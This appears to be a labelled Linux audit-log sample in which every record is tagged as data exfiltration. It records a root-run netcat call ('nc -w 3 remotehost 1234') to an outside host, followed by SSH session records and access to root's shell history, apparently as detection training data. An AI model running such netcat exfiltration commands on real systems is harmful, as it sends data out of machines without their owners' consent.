DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:27.530:14563),proctitle=nc -w 3 remotehost 1234
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:27.530:14563),item=1,name=/lib64/ld-linux-x86-64.so.2,inode=1853150,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:27.530:14563),item=0,name=/usr/bin/nc,inode=1836100,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:27.530:14563),cwd=/home/ubuntu
DATA EXFILTRATION,type=EXECVE,msg=audit(12/03/2025 03:25:27.530:14563),argc=5,a0=nc,a1=-w,a2=3,a3=remotehost,a4=1234
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:27.530:14563),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec8811970,a1=0x5eaec880e470,a2=0x5eaec87f0520,a3=0x5eaec88089a0,items=2,ppid=28139,pid=28147,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=nc,exe=/usr/bin/nc.openbsd,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=USER_END,msg=audit(12/03/2025 03:25:37.468:14564),pid=3625,uid=root,auid=ubuntu,ses=4,subj=unconfined,op=PAM:session_close,"grantors=pam_selinux,pam_loginuid,pam_keyinit,pam_permit,pam_umask,pam_unix,pam_systemd,pam_mail,pam_limits,pam_env,pam_env,pam_selinux",acct=ubuntu,exe=/usr/sbin/sshd,hostname=192.168.10.1,addr=192.168.10.1,terminal=ssh,res=success
DATA EXFILTRATION,type=CRED_DISP,msg=audit(12/03/2025 03:25:37.469:14565),pid=3625,uid=root,auid=ubuntu,ses=4,subj=unconfined,op=PAM:setcred,grantors=pam_permit,acct=ubuntu,exe=/usr/sbin/sshd,hostname=192.168.10.1,addr=192.168.10.1,terminal=ssh,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:37.512:14566),proctitle=bash
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:37.512:14566),item=0,name=/root/.bash_history,inode=917534,dev=08:02,mode=file,600,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:37.512:14566),cwd=/home/ubuntu
